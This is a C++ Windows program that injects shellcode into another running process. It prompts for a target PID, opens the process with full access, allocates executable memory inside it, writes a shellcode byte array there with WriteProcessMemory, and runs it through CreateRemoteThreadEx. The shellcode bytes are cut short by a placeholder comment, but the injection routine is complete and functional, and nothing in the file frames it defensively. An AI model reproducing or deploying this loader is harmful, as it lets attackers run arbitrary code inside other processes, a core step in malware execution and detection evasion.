#include <Windows.h>
#include <iostream>
#include <string>
#include <iomanip>
#pragma comment(lib, "ntdll.lib")

using namespace std;

typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);

void LogHex(const string& message, PVOID value) {
    cout << "[+] " << message << " : 0x" << hex << uppercase << (uintptr_t)value << nouppercase << dec << endl;
}

int main() {
    string pidInput;
    DWORD targetPid;

    cout << "Enter the PID of the target process: ";
    getline(cin, pidInput);
    targetPid = stoi(pidInput);

    HANDLE hProcess = NULL;
    LPVOID remoteBuffer = NULL;
    unsigned char shellcode[] =
        "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
        // rest of shellcode 
        "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

    if (targetPid == 0) {
        cerr << "[!] Invalid PID input." << endl;
        return 1;
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hProcess == NULL) {
        cerr << "[!] Couldn't get a handle to the process (PID: " << targetPid << "). Error: " << GetLastError() << endl;
        return 1;
    }

    remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        cerr << "[!] Couldn't allocate buffer in the target process. Error: " << GetLastError() << endl;
        CloseHandle(hProcess);
        return 1;
    }

    LogHex("Allocated buffer", remoteBuffer);

    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL)) {
        cerr << "[!] Failed to write shellcode into the target process. Error: " << GetLastError() << endl;
        CloseHandle(hProcess);
        return 1;
    }

    cout << "[+] Shellcode written to process memory." << endl;

    DWORD threadId;
    HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, 0, &threadId);
    if (hThread == NULL) {
        cerr << "[!] Couldn't create remote thread. Error: " << GetLastError() << endl;
        CloseHandle(hProcess);
        return 1;
    }

    LogHex("Created remote thread", (PVOID)threadId);
    cout << "[+] Thread execution started." << endl;

    CloseHandle(hProcess);
    CloseHandle(hThread);

    cout << "[+] Process completed successfully!" << endl;

    return 0;
}
